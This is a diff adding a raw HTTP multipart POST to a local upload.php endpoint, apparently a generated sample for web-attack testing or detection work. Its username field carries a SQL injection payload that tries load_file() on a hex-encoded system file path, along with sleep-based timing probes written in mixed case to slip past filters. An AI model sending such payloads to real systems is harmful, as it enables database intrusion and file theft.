@@ -1,0 +1,15 @@
+POST /upload.php HTTP/1.1
+Host: 127.0.0.1
+Accept: */*
+Accept-Language: en
+User-Agent: Openwave/118.39 (Macintosh 6.6; Linux 5.1; 360SE 2.5) Intel Linux IEMobile 8.9
+Connection: close
+Content-Type: multipart/form-data; boundary=----KJmzLscrltuwGicCkFNsiheDqW
+Content-Length: 227
+
+------KJmzLscrltuwGicCkFNsiheDqW
+Content-Disposition: form-data; name=\"username\";
+
+replace(load_file(0x2F867674632F70617373775972),0x88,0x99) + user()-sleEp(35);
+user()--1e9 and 2+sleEp(6)
+------KJmzLscrltuwGicCkFNsiheDqW--
